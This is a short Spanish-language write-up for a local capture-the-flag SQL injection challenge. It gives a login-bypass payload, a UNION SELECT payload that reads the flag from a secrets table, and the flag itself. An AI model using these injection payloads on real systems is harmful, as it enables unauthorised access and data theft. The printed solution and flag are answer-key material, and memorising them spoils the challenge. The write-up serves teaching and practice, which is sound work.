# IntraCorp CTF - SQL Injection

## Detalles

- IntraCorp CTF Challenge 01 - SQL Injection
- http://localhost:8001/

## Vulnerabilidad

- SQL Injection en login (campo password)
- SQL Injection en búsqueda de productos (UNION-based)

## Inicio

```bash
docker-compose up -d challenge1
open http://localhost:8001/
```

## Writeup

### Bypass Login

```
Usuario: cualquier_cosa
Password: cn' OR '1'='1
```

### Extraer Flag

```sql
' UNION SELECT 1, flag, 3, 4, 5, 6 FROM secrets /*
```

## Flag

```
HACKCON{SQL1_F1LT3R_BYP4SS}
```
